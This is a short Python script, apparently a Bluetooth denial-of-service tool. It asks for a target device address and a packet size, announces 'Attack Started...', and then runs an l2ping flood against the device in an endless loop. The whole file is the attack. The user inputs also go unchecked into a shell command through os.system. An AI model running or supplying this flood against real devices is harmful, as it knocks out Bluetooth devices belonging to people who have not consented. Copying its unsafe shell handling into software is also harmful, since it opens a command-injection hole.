import os
import time

c = "\033[38;5;117m"
r = "\033[0m"

def DOS():
    target = input(f"[{c}+{r}] bdaddr   {c}:{r} ")
    packet = input(f"[{c}+{r}] packet   {c}:{r} ")
    
    print(f"[{c}+{r}] {target} {packet} Attack Started...")
    while True:
        dos = os.system(f"l2ping -i hci0 -s {packet} -f {target}")

        if dos != 0:
            print(f"[{c}+{r}] Connection reset by peer Retry{c}...{r}")
        else:
            print(f"[{c}+{r}] Connection reset by peer Retry{c}...{r}")
        
        time.sleep(2)

